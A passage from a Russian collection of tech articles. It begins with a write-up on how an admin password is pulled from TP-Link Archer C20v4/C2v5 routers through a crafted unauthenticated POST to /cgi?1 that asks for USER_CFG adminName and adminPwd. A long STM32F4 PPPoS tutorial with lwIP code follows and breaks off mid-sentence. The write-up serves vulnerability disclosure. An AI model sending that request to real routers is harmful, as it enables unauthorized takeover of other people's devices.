доступ.\r\nДостаточно сложный пароль, чтобы не беспокоиться о его подборе и ограниченный круг лиц знающий его.\r\nСпустя сутки: подмена dns и все запросы заворачиваются на заглушку.\r\n\r\nЧто нужно: \r\nВыяснить, каким способом был получен доступ к устройству.\r\n\r\nПервым делом на тестовом пациенте были опробованы все известные старые баги, которые нашлись в гугле. Конечно же ничего не сработало. \r\n\r\nБыл найден скрипт на гитхабе (тык) который позволяет удаленно, от рута, выполнять команды на моделях C20i и C2. Немного не то, что нам нужно, но задало верное направление.\r\n\r\nВо всех функциях были одинаковые «оболочки» для запросов — это POST запросы на url /cgi?2( и 7), \"[название_настройки#0,0,0,0,0,0#0,0,0,0,0,0]\" и особый referer.\r\n\r\nСкачиваем с официального сайта tp-link исходные коды нашей прошивки и распаковываем. Т.к. линейка роутеров одна, то и ПО должно быть хоть чуточку похожим, верно?\r\n\r\ngrepgrep -Hrn \"/cgi?2\"\n----------------------------------------------\n../../setPwd.htm:278: xmlHttpObj.open(\"POST\", \"/cgi?2\", true);\r\n\r\nБинго. Название файла как бы намекает, что дальше будет очень интересно. Находим в коде строчку, в которой видели заветное «cgi?2». Ниже приведена целиком функция:\r\n\r\ndoSetUsrName    function doSetUsrName() {\n        var xmlHttpObj;\n        var args = \"[USER_CFG#0,0,0,0,0,0#0,0,0,0,0,0]0,1\\r\\nadminName=\" + $(\"newUsr\").value + \"\\r\\n\";\n\n        xmlHttpObj = getHttpObject(function() {\n            if (xmlHttpObj.status == 200) {\n                getUsrName();\n            } else\n                return;\n        });\n        xmlHttpObj.open(\"POST\", \"/cgi?2\", true);\n        xmlHttpObj.send(args);\n    }\n\r\n\r\nЭта функция при выполнении вызывает другую — getUsrName(). \r\n\r\nФункция получения логина:\r\n\r\ngetUsrName function getUsrName() {\n        var xmlHttpObj;\n        var args = \"[USER_CFG#0,0,0,0,0,0#0,0,0,0,0,0]0,1\\r\\nadminName\\r\\n\";\n\n        xmlHttpObj = getHttpObject(function() {\n            if (xmlHttpObj.status == 200) {\n                currUserName = xmlHttpObj.responseText.split(\"\\n\")[1].replace(\"adminName=\", \"\");\n                doSetPassword();\n            } else\n                return;\n        });\n        xmlHttpObj.open(\"POST\", \"/cgi?1\", true);\n        xmlHttpObj.send(args);\n    }\n\r\n\r\nНо просто с логином ничего не сделать. Нас интересует пароль. Мы знаем, что логин хранится в переменной adminName, внутри объекта USER_CFG. Поиск по исходникам дал следующие результаты: (оставлю только нужный результат)\r\n\r\nВывод grep'аgrep -Hrn USER_CFG\n------------------------\nsysfiles/config/en/common/reduced_data_model.xml\n\r\n\r\nОткрываем reduced_data_model.xml и находим в нем следующий фрагмент кода:\r\n\r\nXML<X_TP_UserCfg t=o r=P s=USER_CFG_OBJ h=1 >\n                <RootName t=s r=R l=16 al=cli h=1 />\n                <RootPwd t=s r=R l=16 al=cli h=1 />\n                <AdminName t=s r=W l=16 al=cli d=admin h=1 />\n                <AdminPwd t=s r=W l=16 al=cli d=admin h=1 />\n                <UserName t=s r=W l=16 al=cli h=1 />\n                <UserPwd t=s r=W l=16 al=cli h=1 />\n        </X_TP_UserCfg>\r\n\r\nТут у нас хранится уже известная нам переменная «AdminName» и рядышком — AdminPwd. Похоже на правду.\r\n\r\nТеперь нам осталось сформировать корректный POST-запрос, на который роутер нам ответить нужными данными. Обратимся снова к скрипту с гитхаба и посмотрим, как сделано там:\r\n\r\ndatadata = (\n            \"[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\\r\\n\"\n            \"dataBlockSize=64\\r\\n\"\n            \"timeout=1\\r\\n\"\n            \"numberOfRepetitions=1\\r\\n\"\n            \"host=127.0.0.1\\r\\n\"\n            \"X_TP_ConnName=ewan_ipoe_s\\r\\n\"\n            \"diagnosticsState=Requested\\r\\n\"\n        )\r\n\r\nПо аналогии формируем свой запрос:\r\n\r\ndata\"[USER_CFG#0,0,0,0,0,0#0,0,0,0,0,0]0,2\\r\\n\"\n\"adminName\\r\\n\"\n\"adminPwd\\r\\n\"\r\n\r\nИиииии отправляем. В Wireshark'e пакет выглядит вот так: \r\n\r\nзапрос\r\n\r\nСмотрим ответ:\r\n\r\nответ\r\n\r\nВнимательный читатель заметит, что POST-запрос был отправлен к \"/cgi?1\", а не как в скрипте к \"/cgi?2\". Всё верно. Нам нужно всего лишь узнать пароль. Получив данные для авторизации можно заниматься уже форменным безобразием.\r\n\r\nАвторизуемся:\r\n\r\nGET запрос\r\n\r\nИ уже авторизованным сдираем любые данные, какие мы только посчитаем важными, посмотрев в файлике reduced_data_model.xml:\r\n\r\nзапрос\r\n\r\nответ\r\n\r\nзапрос\r\n\r\nответ\r\n\r\nНа данный момент исходные коды роутера C20v4 убраны с сайта Tp-Link и выложены вместо них коды V5. Но официальной прошивки пока, к сожалению, нет. \r\n\r\nХорошая новость: Данная уязвимость эксплуатируется только, если веб доступ открыт для всех.\r\nПлохая новость: чьи-то боты уже стучаться по внешним адресам с правильными запросами.\r\n\r\nПомимо модели ArcherC20V4 данной уязвимости так же подвержена модель ArcherC2V5.", "images": [{"img": "http://www.picshare.ru/uploads/180801/6PLFo24GU8.jpg"}, {"img": "http://www.picshare.ru/uploads/180801/699Zk8aAc9.jpg"}, {"img": "http://www.picshare.ru/uploads/180801/38l6P7FP2M.jpg"}, {"img": "http://www.picshare.ru/uploads/180801/3A2hWMc88m.jpg"}, {"img": "http://www.picshare.ru/uploads/180801/3P672yU2e8.jpg"}, {"img": "http://www.picshare.ru/uploads/180801/6Gr0PAZB2b.jpg"}, {"img": "http://www.picshare.ru/uploads/180801/m93oC9X3i3.jpg"}]}, {"header": "Реализация PPPOS на stm32f4-discovery", "text": "Однажды передо мной возникла задача обеспечить выход в сеть Интернет на STM32 имея для этого только COM порт. Для решения этой задачи мне понадобился PPP, или, еcли быть точным, PPPoS (англ. Point-to-Point Protocol over Serial — один из способов реализации PPP, используется при подключении через COM-порт).\r\n\r\nВ процессе решения поставленной передо мной задачи я столкнулся с некоторыми трудностями, одна из которых недостаточное, на мой взгляд, освещение вопросов связанных с PPPoS в сети Интернет. Этим постом я постараюсь закрыть обозначенный пробел, на сколько позволят мои скромные знания. \r\n\r\nСтатья описывает создание проекта для System Workbench for STM32 с нуля. Показывает пример работы с UART. Есть примеры кода для реализации PPP. Ну и конечно, пример отправки сообщения на соседний компьютер.\r\n\r\nВведение\r\nPPP (англ. Point-to-Point Protocol) — двухточечный протокол канального уровня (Data Link) сетевой модели OSI. Обычно используется для установления прямой связи между двумя узлами сети, причём он может обеспечить аутентификацию соединения, шифрование и сжатие данных. Используется на многих типах физических сетей: нуль-модемный кабель, телефонная линия, сотовая связь и т. д.\r\n\r\nЧасто встречаются подвиды протокола PPP, такие, как Point-to-Point Protocol over Ethernet (PPPoE), используемый для подключения по Ethernet, и иногда через DSL; и Point-to-Point Protocol over ATM (PPPoA), который используется для подключения по ATM Adaptation Layer 5 (AAL5), который является основной альтернативой PPPoE для DSL.\r\n\r\nPPP представляет собой целое семейство протоколов: протокол управления линией связи (LCP), протокол управления сетью (NCP), протоколы аутентификации (PAP, CHAP), многоканальный протокол PPP (MLPPP). \r\n\r\nИз Wikipedia.\r\n\r\nПодготовка\r\nДля решения поставленной задачи нам понадобится:\r\n\r\nЖелезо:\r\n\r\nОтладочная плата stm32f4_discovery:\r\n\r\n\r\nПереходник USB — miniUSB для подключения платы к компьютеру.\r\nДва переходника USBtoUART FT232:\r\n\r\n\r\nТак же пригодятся два USB удлинителя, не обязательно, но просто удобно.\r\n\r\nСофт:\r\n\r\nВиртуальная машина VirtualBox. Скачать можно тут. Также качаем и устанавливаем Extension Pack для VirtualBox.\r\nДва установочных диска с операционными системами Windows и Linux. Windows берем тут, Linux тут.\r\n\r\nПосле установки ОС потребуется установка дополнений гостевой ОС. Для поставленной задачи нам достаточно будет 32х систем, можно не морочиться с включением виртуализации.\r\nДля Windows нам понадобится программа способная принимать запросы и отвечать на них по протоколу TCP/IP, ну и терминальная программа для работы с COM портом. PacketSender качаем тут (нажмите на «No thanks, just let me download.»), терминал тут. Кроме того нам понадобится STM32CubeMX для первоначальной настройки проекта. Качаем с st.com (после регистрации ссылка придет на электронную почту).\r\nНа основную ОС ставим System Workbench for STM32. Качаем отсюда (потребуется регистрация).\r\n\r\nЭтап 1. Создание проекта\r\nПервым делом открываем STM32CubeMX и создаем там новый проект под нашу плату stm32f4-discovery. Включаем RCC, Ethernet (ETH), SYS, USART2, USART3, после чего включаем FREERTOS и LWIP. \r\n\r\n\r\n\r\n\r\nДля диагностики нам понадобятся светодиоды на плате. По этому настроем ноги PD12-PD15 как GPIO_Output. \r\n\r\n\r\n\r\nНа вкладке Clock Configuration настраиваем частоту, как на картинке ниже. \r\n\r\n\r\n\r\nДалее, на вкладке Configuration настраиваем порты USART. Мы будем работать с ними в режиме DMA. У нас два порта USART, один мы будем использовать для передачи и получения данных по протоколу PPP, второй для логирования. Чтобы они заработали нам нужно настроить DMA на RX и TX для обоих портов. Для всех ножек настройки DMA приоритет ставим «Medium». Для USART2 ножке RX устанавливаем режим «Circular». Остальные настройки оставляем по-умолчанию. \r\n\r\n\r\n\r\nТакже потребуется включить глобальное прерывание для обоих портов на вкладке «NVIC Settings».\r\n\r\nНа этом первоначальная настройка проекта в STM32CubeMX завершена. Сохраняем файл проекта и делаем генерацию кода для System Workbench for STM32.\r\n\r\n\r\n\r\nРеализация\r\nТеперь проверим, что выгруженный код компилируется и работает. Для этого в файле main.c в функции «StartDefaultTask» заменим тело бесконечного цикла for(;;) на код включения и выключения светодиодов.\r\n\r\nДолжно получиться так:\r\n\r\n/* StartDefaultTask function */\nvoid StartDefaultTask(void const * argument)\n{\n  /* init code for LWIP */\n  MX_LWIP_Init();\n\n  /* USER CODE BEGIN 5 */\n  /* Infinite loop */\n  for(;;)\n  {\n    HAL_GPIO_WritePin(GPIOD, GPIO_PIN_12|GPIO_PIN_13|GPIO_PIN_14|GPIO_PIN_15, GPIO_PIN_SET);\n    osDelay(1000);\n    HAL_GPIO_WritePin(GPIOD, GPIO_PIN_12|GPIO_PIN_13|GPIO_PIN_14|GPIO_PIN_15, GPIO_PIN_RESET);\n    osDelay(1000);\n  }\n  /* USER CODE END 5 */ \n}\n\r\nКомпилируем прошиваем и смотрим. На плате должны моргать все четыре светодиода.\r\n\r\nЭтап 2. Работа с USART\r\n Следующая наша задача это проверить правильность работы наших USART.\r\n\r\nПервое, что нам нужно сделать это подключить наши FT232 к discovery. Для этого смотрим на какие ножки разведены USART интерфейсы. У меня это PD6 и PD5 для USART2_RX и USART2_TX соответственно. \r\n\r\n\r\n\r\nА также PD9 и PD8 для USART3_RX и USART3_TX соответственно. \r\n\r\n\r\n\r\nКроме того нам понадобится ножка GND.\r\n\r\nНаходим эти выводы на плате и соединяем с выводами FT232 при этом вывод GND на плате может быть любым, вывод RX на плате должен быть соединен с выводом TX на FT232, а вывод TX на плате должен быть соединен с выводом RX на FT232. Остальные выводы не используются.\r\n\r\nОсталось подключить наши FT232 к USB портам компьютера, а также подключить к компьютеру саму плату discovery через разъем miniUSB (не путать с microUSB).\r\n\r\nПосле подключения FT232 основная ОС установит для них драйвера, после чего эти устройства нужно будет пробросить в гостевую Windows на виртуальной машине.\r\n\r\nТеперь добавляем программный код, который нужен для работы наших USART. Для этого мы добавим четыре файла: usart.h, usart.c, logger.h, logger.c.\r\n\r\nСодержимое файлов:\r\n\r\nфайл usart.h\r\n#ifndef _USART_\n#define _USART_\n\n#include \"stm32f4xx_hal.h\"\n\nvoid usart_Open(void);\nbool usart_Send(char* bArray, int size_bArray);\nuint16_t usart_Recv(char* bArray, uint16_t maxLength);\n\n#endif /* _USART_ */\n\r\nфайл usart.c\r\n#include \"usart.h\"\n#include \"logger.h\"\n\n#include \"cmsis_os.h\"\n\n#define Q_USART2_SIZE 200\n\nxQueueHandle g_qUsart;\nosThreadId g_usart_rxTaskHandle;\n\nextern UART_HandleTypeDef huart2;\n\nvoid usart_rxTask(void);\n\nuint8_t bGet[Q_USART2_SIZE] = {0};\nuint16_t g_tail = 0;\n\nvoid usart_Open(void)\n{\n\tg_qUsart = xQueueCreate( Q_USART2_SIZE, sizeof( unsigned char ) );\n\n\tosThreadDef(usart_rxTask_NAME, usart_rxTask, osPriorityNormal, 0, Q_USART2_SIZE/4+128);\n\tg_usart_rxTaskHandle = osThreadCreate(osThread(usart_rxTask_NAME), NULL);\n\n\tHAL_UART_Receive_DMA(&huart2, bGet, Q_USART2_SIZE);\n\n}\n\nvoid usart_rxTask(void)\n{\n\tfor(;;)\n\t{\n\t\tuint16_t length = Q_USART2_SIZE - huart2.hdmarx->Instance->NDTR;\n\n\t\twhile(length - g_tail)\n\t\t{\n\t\t\tuint8_t tmp = bGet[g_tail];\n\t\t\txQueueSendToBack( g_qUsart, &tmp, 100 );\n\t\t\tg_tail++;\n\t\t\tif (g_tail == Q_USART2_SIZE)\n\t\t\t\tg_tail = 0;\n\t\t}\n\t}\n}\n\nbool usart_Send(char* bArray, int size_bArray)\n{\n\tHAL_StatusTypeDef status;\n\n\tstatus = HAL_UART_Transmit_DMA(&huart2, bArray, size_bArray);\n\n\twhile (HAL_UART_GetState(&huart2) != HAL_UART_STATE_READY)\n\t{\n\t\tif (HAL_UART_GetState(&huart2) == HAL_UART_STATE_BUSY_RX)\n\t\t\tbreak;\n\n\t\tosDelay(1);\n\t}\n\n\tif (status == HAL_OK)\n\t\treturn true;\n\n\treturn false;\n}\n\nuint16_t usart_Recv(char* bArray, uint16_t maxLength)\n{\n\tuint8_t tmp = 0;\n\tuint16_t length = 0;\n\twhile(uxQueueMessagesWaiting(g_qUsart))\n\t{\n\t\txQueueReceive( g_qUsart, &tmp, 100 );\n\t\tbArray[length] = tmp;\n\t\tlength++;\n\t\tif (length >= maxLength)\n\t\t\tbreak;\n\t}\n\n\treturn length;\n}\n\r\nфайл logger.h\r\n#ifndef _LOGGER_\n#define _LOGGER_\n\nvoid logger(const char *format, ...);\n\n#endif /* _LOGGER_ */\n\r\nфайл logger.c\r\n#include \"logger.h\"\n\n#include \"stm32f4xx_hal.h\"\n#include <stdarg.h>\n\nextern UART_HandleTypeDef huart3;\n\n#define MAX_STRING_SIZE 1024\n\nHAL_StatusTypeDef logger_Send(char* bArray, uint32_t size_bArray)\n{\n\tHAL_StatusTypeDef status;\n\n\tfor(int i=0;i<5;i++)\n\t{\n\t\tstatus = HAL_UART_Transmit_DMA(&huart3, bArray, size_bArray);\n\t\tif (status == HAL_OK)\n\t\t\tbreak;\n\t\tosDelay(2);\n\t}\n\n\n\twhile (HAL_UART_GetState(&huart3) != HAL_UART_STATE_READY)\n\t{\n\t\tosDelay(1);\n\t}\n\n\treturn status;\n}\n\nvoid logger(const char *format, ...)\n{\n\t\tchar buffer[MAX_STRING_SIZE];\n\n\t\tva_list args;\n\t\tva_start (args, format);\n\t\tvsprintf(buffer, format, args);\n\t\tva_end(args);\n\n\t\tbuffer[MAX_STRING_SIZE-1]=0;\n\n\t\tlogger_Send(buffer, strlen(buffer));\n}\n\r\nUsart нам нужен для передачи и получения данных по usart2. Он будет нашим основным интерфейсом общения с PPP-сервером.\r\n\r\nLogger нам нужен для реализации логирования, путем посылки сообщений в терминал. Функция void usart_Open(void) формирует очередь и запускает задачу по обслуживанию этой очереди. Эту функцию нужно выполнить до начала работы с USART. Дальше все просто, функция bool usart_Send(char* bArray, int size_bArray) отправляет данные в порт, а \r\nuint16_t usart_Recv(char* bArray, uint16_t maxLength) получает их из очереди, в которую их любезно сложила функция void usart_rxTask(void).\r\n\r\nДля логера все еще проще, там не требуется получения данных следовательно, ни очереди, ни задачи обслуживания очереди не нужно.\r\n\r\nВ начало файла main.h нужно добавить несколько дефайнов описывающих тип bool, отсутствующий в языке C.\r\n\r\n/* USER CODE BEGIN Includes */\ntypedef unsigned char bool;\n#define true 1\n#define false 0\n/* USER CODE END Includes */\n\r\nТеперь пришло время проверить работоспособность полученного кода. Для этого в файле main.c, изменим код уже известной нам задачи «StartDefaultTask»\r\n\r\n/* USER CODE BEGIN 4 */\n#include \"usart.h\"\n#include \"logger.h\"\n#define MAX_MESSAGE_LENGTH 100\n/* USER CODE END 4 */\n\n/* StartDefaultTask function */\nvoid StartDefaultTask(void const * argument)\n{\n  /* init code for LWIP */\n  MX_LWIP_Init();\n\n  /* USER CODE BEGIN 5 */\n  usart_Open();\n  /* Infinite loop */\n  uint8_t send[] = \"Send message\\r\\n\";\n  uint8_t recv[MAX_MESSAGE_LENGTH] = {0};\n  uint16_t recvLength = 0;\n  for(;;)\n  {\n\tHAL_GPIO_WritePin(GPIOD, GPIO_PIN_12|GPIO_PIN_13|GPIO_PIN_14|GPIO_PIN_15, GPIO_PIN_SET);\n\tosDelay(1000);\n\tHAL_GPIO_WritePin(GPIOD, GPIO_PIN_12|GPIO_PIN_13|GPIO_PIN_14|GPIO_PIN_15, GPIO_PIN_RESET);\n\tosDelay(1000);\n\n\tif (usart_Send(send, sizeof(send)-1))\n\t  logger(\"SEND - %s\", send);\n\trecvLength = usart_Recv(recv, MAX_MESSAGE_LENGTH-1);\n\tif (recvLength)\n\t{\n\t  recv[recvLength] = 0;\n\t  logger(\"RECV - %s\\r\\n\", recv);\n\t}\n  }\n  /* USER CODE END 5 */ \n}\n\r\nКроме того нужно дать побольше памяти стеку нашей задачи. Для этого в вызове функции osThreadDef(), файла main.c, нужно 128 исправить на 128*10 чтобы получилось так:\r\n\r\nosThreadDef(defaultTask, StartDefaultTask, osPriorityNormal, 0, <b>128*10</b>);\r\nКомпилируем и прошиваем. Светодиоды моргают так же как и в предыдущей задаче.\r\n\r\nЧтобы увидеть результат наших трудов нужно в нашей виртуальной машине запустить программу Terminal. Один экземпляр программы для логирующего порта, второй для основного. Посмотрите в диспетчере устройств какие номера портов были назначены вашим FT232. Если были назначены номера более 10, переназначьте.\r\n\r\nПри запуске второго экземпляра программы может возникнуть ошибка, закройте окно с ошибкой и продолжите работать с программой.\r\n\r\nДля обоих портов устанавливаем соединение на 115200 бод, data bits — 8, parity — none, stop bits — 1, handshaking — none.\r\n\r\nЕсли вы все сделали правильно, то в окне терминала для usart2 будет передаваться сообщение «Send message». В окно терминала для логера будет дублироваться это же сообщение только с префиксом «SEND — »\r\n\r\nЕсли в окне терминала для usart2 вы вобьете какой-то текст в поле «Send» и нажмете соответствующую кнопку, справа от этого поля, то в окне логера вы увидите это же сообщение с префиксом «RECV — »\r\n\r\nНа картинке ниже: слева — логер, справа — usart2.\r\n\r\n\r\n\r\nЭтап 3. Начинаем работать с PPP\r\nВ рамках этой задачи мы поднимем PPP-соединение. Первым делом включаем использование PPP, меняем значение дефайна PPP_SUPPORT в файле ppp_opts.h на 1. Затем переопределяем нужные нам дефайны в файле lwipopts.h, \r\n\r\n/* USER CODE BEGIN 1 */\n#define MEMP_NUM_SYS_TIMEOUT 8\n#define CHECKSUM_GEN_IP 1\n#define CHECKSUM_GEN_TCP 1\n/* USER CODE END 1 */\n\r\nПри этом старые дефайны нужно закомментировать.\r\n\r\nТеперь изменяем файл lwip.c, вставляем в блок «/* USER CODE BEGIN 0 */» следующий код:\r\n\r\n/* USER CODE BEGIN 0 */\n#include \"usart.h\"\n\n#include \"pppos.h\"\n#include \"sio.h\"\n#include \"dns.h\"\n#include \"ppp.h\"\n\nstatic ppp_pcb *ppp;\nstruct netif pppos_netif;\n\nvoid PppGetTask(void const * argument)\n{\n  uint8_t recv[2048];\n  uint16_t length = 0;\n  for(;;)\n  {\n\tlength=usart_Recv(recv, 2048);\n\tif (length)\n\t{\n\t\tpppos_input(ppp, recv, length);\n\t\tlogger(\"read - PppGetTask() len = %d\\n\", length);\n\t}\n\n\tosDelay(10);\n  }\n\n}\n\n#include \"ip4_addr.h\"\n#include \"dns.h\"\n\nstatic void ppp_link_status_cb(ppp_pcb *pcb, int err_code, void *ctx)\n{\n\t\tstruct netif *pppif = ppp_netif(pcb);\n\t\tLWIP_UNUSED_ARG(ctx);\n\n\t\tswitch(err_code)\n\t\t{\n\t\t\tcase PPPERR_NONE:               /* No error. */\n\t\t\t{\n\t\t\t\tlogger(\"ppp_link_status_cb: PPPERR_NONE\\n\\r\");\n\t\t\t\tlogger(\"   our_ip4addr = %s\\n\\r\", ip4addr_ntoa(netif_ip4_addr(pppif)));\n\t\t\t\tlogger(\"   his_ipaddr  = %s\\n\\r\", ip4addr_ntoa(netif_ip4_gw(pppif)));\n\t\t\t\tlogger(\"   netmask     = %s\\n\\r\", ip4addr_ntoa(netif_ip4_netmask(pppif)));\n\t\t\t}\n\t\t\tbreak;\n\n\t\t\tcase PPPERR_PARAM:             /* Invalid parameter. */\n\t\t\t\t\tlogger(\"ppp_link_status_cb: PPPERR_PARAM\\n\");\n\t\t\t\t\tbreak;\n\n\t\t\tcase PPPERR_OPEN:              /* Unable to open PPP session. */\n\t\t\t\t\tlogger(\"ppp_link_status_cb: PPPERR_OPEN\\n\");\n\t\t\t\t\tbreak;\n\n\t\t\tcase PPPERR_DEVICE:            /* Invalid I/O device for PPP. */\n\t\t\t\t\tlogger(\"ppp_link_status_cb: PPPERR_DEVICE\\n\");\n\t\t\t\t\tbreak;\n\n\t\t\tcase PPPERR_ALLOC:             /* Unable to allocate resources. */\n\t\t\t\t\tlogger(\"ppp_link_status_cb: PPPERR_ALLOC\\n\");\n\t\t\t\t\tbreak;\n\n\t\t\tcase PPPERR_USER:              /* User interrupt. */\n\t\t\t\t\tlogger(\"ppp_link_status_cb: PPPERR_USER\\n\");\n\t\t\t\t\tbreak;\n\n\t\t\tcase PPPERR_CONNECT:           /* Connection lost. */\n\t\t\t\t\tlogger(\"ppp_link_status_cb: PPPERR_CONNECT\\n\");\n\t\t\t\t\tbreak;\n\n\t\t\tcase PPPERR_AUTHFAIL:          /* Failed authentication challenge. */\n\t\t\t\t\tlogger(\"ppp_link_status_cb: PPPERR_AUTHFAIL\\n\");\n\t\t\t\t\tbreak;\n\n\t\t\tcase PPPERR_PROTOCOL:          /* Failed to meet protocol. */\n\t\t\t\t\tlogger(\"ppp_link_status_cb: PPPERR_PROTOCOL\\n\");\n\t\t\t\t\tbreak;\n\n\t\t\tcase PPPERR_PEERDEAD:          /* Connection timeout. */\n\t\t\t\t\tlogger(\"ppp_link_status_cb: PPPERR_PEERDEAD\\n\");\n\t\t\t\t\tbreak;\n\n\t\t\tcase PPPERR_IDLETIMEOUT:       /* Idle Timeout. */\n\t\t\t\t\tlogger(\"ppp_link_status_cb: PPPERR_IDLETIMEOUT\\n\");\n\t\t\t\t\tbreak;\n\n\t\t\tcase PPPERR_CONNECTTIME:       /* PPPERR_CONNECTTIME. */\n\t\t\t\t\tlogger(\"ppp_link_status_cb: PPPERR_CONNECTTIME\\n\");\n\t\t\t\t\tbreak;\n\n\t\t\tcase PPPERR_LOOPBACK:          /* Connection timeout. */\n\t\t\t\t\tlogger(\"ppp_link_status_cb: PPPERR_LOOPBACK\\n\");\n\t\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\t\tlogger(\"ppp_link_status_cb: unknown errCode %d\\n\", err_code);\n\t\t\t\t\tbreak;\n\t\t}\n}\n\n// Callback used by ppp connection\nstatic u32_t ppp_output_cb(ppp_pcb *pcb, u8_t *data, u32_t len, void *ctx)\n{\n\tLWIP_UNUSED_ARG(pcb);\n\tLWIP_UNUSED_ARG(ctx);\n\n\tif (len > 0)\n\t{\n\t\tif (!usart_Send(data, len))\n\t\t\t\treturn 0x05;\n\t}\n\tlogger(\"write - ppp_output_cb() len = %d\\n\", len);\n\n\treturn len;\n}\n\nvoid pppConnect(void)\n{\n\tppp = pppos_create(&pppos_netif, ppp_output_cb, ppp_link_status_cb, NULL);\n\tppp_set_default(ppp);\n\n\tosThreadId PppGetTaskHandle;\n\tosThreadDef(PPP_GET_TASK_NAME, PppGetTask, osPriorityNormal, 0, 128*10);\n\tPppGetTaskHandle = osThreadCreate(osThread(PPP_GET_TASK_NAME), NULL);\n\n\terr_t err = ppp_connect(ppp,0);\n\tif (err == ERR_ALREADY)\n\t{\n\t\tlogger(\"Connected successfully\");\n\t}\n\n\tfor(int i=0;i<40;i++)\n\t{\n\t\tosDelay(500);\n\t\tif (ppp->phase >= PPP_PHASE_RUNNING)\n\t\t\tbreak;\n\t}\n\n}\n\n/* USER CODE END 0 */\n\r\nЗатем в функцию MX_LWIP_Init(), в блок «/* USER CODE BEGIN 3 */» добавляем вызов функции pppConnect().\r\n\r\nКроме того нужно увеличить размер кучи, для этого в файле FreeRTOSConfig.h нужно закомментировать дефайн configTOTAL_HEAP_SIZE, а в конце файла, в блоке /* USER CODE BEGIN Defines */ объявить его с новым значением.\r\n\r\n/* USER CODE BEGIN Defines */   \t      \n/* Section where parameter definitions can be added (for instance, to override default ones in FreeRTOS.h) */\n#define configTOTAL_HEAP_SIZE                    ((size_t)1024*30)\n/* USER CODE END Defines */ \n\r\nА также в файле usart.c изменить значение дефайна Q_USART2_SIZE на 2048.\r\n\r\nНастройка соединения начинается с функции MX_LWIP_Init() она создана автоматически мы лишь добавили в нее вызов функции pppConnect(). В этой функции запускаются задачи обслуживающие PPPOS соединение. Функции pppos_create() нужно передать адреса функций, которые будут обслуживать отправку сообщений и вывод информации об изменении статуса соединения. Для нас это функции ppp_output_cb() и ppp_link_status_cb() соответственно. Кроме того в функции pppConnect() будет запущена задача по обслуживанию полученных сообщений. В конце своей работы функция pppConnect() дождется установления соединения с сервером, после чего завершит свою работу. \r\n\r\nРабота с сетью будет осуществляться на более высоком уровне, как только LWIP решит, что нужно отправить сообщение в сеть, автоматически будет вызвана функция ppp_output_cb(). Ответ из сети будет получен функцией PppGetTask(), в рамках задачи по обслуживанию входящих сообщений, и передан в недра LWIP. Если изментися статус соединения то автоматически будет вызвана функция ppp_link_status_cb().\r\n\r\nИ наконец мы изменим задачу StartDefaultTask. Теперь она должна иметь такой вид:\r\n\r\nvoid StartDefaultTask(void const * argument)\n{\n  /* init code for LWIP */\n//  MX_LWIP_Init();\n\n  /* USER CODE BEGIN 5 */\n  usart_Open();\n  MX_LWIP_Init();\n  /* Infinite loop */\n  for(;;)\n  {\n\tHAL_GPIO_WritePin(GPIOD, GPIO_PIN_12|GPIO_PIN_13|GPIO_PIN_14|GPIO_PIN_15, GPIO_PIN_SET);\n\tosDelay(1000);\n\tHAL_GPIO_WritePin(GPIOD, GPIO_PIN_12|GPIO_PIN_13|GPIO_PIN_14|GPIO_PIN_15, GPIO_PIN_RESET);\n\tosDelay(1000);\n  }\n  /* USER CODE END 5 */ \n}\n\r\nГотово, можно компилировать и прошивать.\r\n\r\nНа этом этапе нужно запустить сервер PPP. Для этого нужно сначала развернуть виртуалку с ОС Linux. Я использовал Ubuntu 16.04 x32. После установки операционной системы нужно настроить использование COM порта.\r\n\r\nВ этой части нам не нужна виртуальная машина с Windows, можно ее смело выключить. Оба FT232 подключаем в Linux.\r\n\r\nВ Linux прежде чем начинать работу с COM портом нужно разрешить пользователю его использовать. Для этого выполним следующую команду:\r\n\r\nsudo addgroup USERNAME dialout\r\nгде USERNAME — имя текущего пользователя.\r\n\r\nЧтобы посмотреть доступные в системе COM порты нужно выполнить команду:\r\n\r\ndmesg | grep tty\r\n\r\n\r\nМы видим, что в системе присутствуют два порта ttyUSB. Мы не можем сразу сказать какой из них logger, а какой usart2. Просто нужно их проверить по очереди.\r\n\r\nСначала выполним команды для чтения из одного порта:\r\n\r\nstty -F /dev/ttyUSB0 115200\ncat /dev/ttyUSB0\r\nзатем из другого:\r\n\r\nstty -F /dev/ttyUSB1 115200\ncat /dev/ttyUSB1\r\nГде увидим такую картину тот и есть logger.\r\n\r\n\r\n\r\nМожно оставить это окно, оно нам не будет мешать.\r\n\r\nДалее нужно разрешить пакетам отправленным из нашей платы покидать пределы своей подсети. Для этого нужно настроить iptables. Выполняем следующие действия:\r\n\r\n1. Откроем новое окно консоли\r\n2. Нужно узнать свой ip и имя сетевого интерфейса (выполните команду ifconfig)\r\n\r\n\r\n\r\n3. Выполните команды настройки nat\r\n\r\nsudo echo 1 | sudo tee -a /proc/sys/net/ipv4/ip_forward > /dev/null\nsudo echo 1 | sudo tee -a /proc/sys/net/ipv4/ip_dynaddr > /dev/null\nsudo iptables -F FORWARD\nsudo iptables -F -t nat\nsudo iptables -t nat -A POSTROUTING -o enp0s3 -j SNAT --to-source 192.168.10.196\nsudo iptables -t nat -L\r\nгде enp0s3 — имя сетевого интерфейса\r\n192.168.10.196 — ваш IP адрес\r\n/proc/sys/net/ipv4/ — путь к соответствующему файлу.\r\n\r\nЭти команды можно переписать в пакетный файл и выполнять его каждый раз перед запуском PPP сервера. Можно добавить и в автозапуск, но я этого не делал.\r\n\r\nТеперь мы готовы к запуску сервера, осталось только создать файл настроек. Я назвал его «pppd.conf», предлагаю использовать следующие настройки:\r\n\r\nnodetach\nnoauth\npassive\nlocal\ndebug\nlock\n192.168.250.1:192.168.250.2\n/dev/ttyUSB1\n115200\nlcp-echo-interval 10\nlcp-echo-failure 1\ncdtrcts\r\nПереписываем настройки в файл после чего можно запускать сервер. Это делается командой sudo pppd file ./pppd.conf\r\n\r\nСервер PPPD должен быть запущен до старта discovery, по этому после старта PPPD нужно нажать на кнопку «Reset» расположенной на плате.\r\n\r\nЕсли вы все сделали правильно, то увидите такую картину:\r\n\r\n\r\n\r\nСлева запущенный pppd, справа logger.\r\n\r\nЭтап 4. Отправляем пакетик\r\nНа этом этапе нам понадобятся обе виртуалки. Linux для pppd и Windows для приема пакета. Для упрощения задачи нужно чтобы обе машины были в одной подсети, идеальным решением будет указать в настроках сети VirtualBox для обоих машин соединение типа «Сетевой мост», а в Windows отключить брандмауэр. \r\n\r\nЗапускаем виртуалки и настраиваем ppp соединение платы discovery с pppd. На Windows узнаем IP адрес 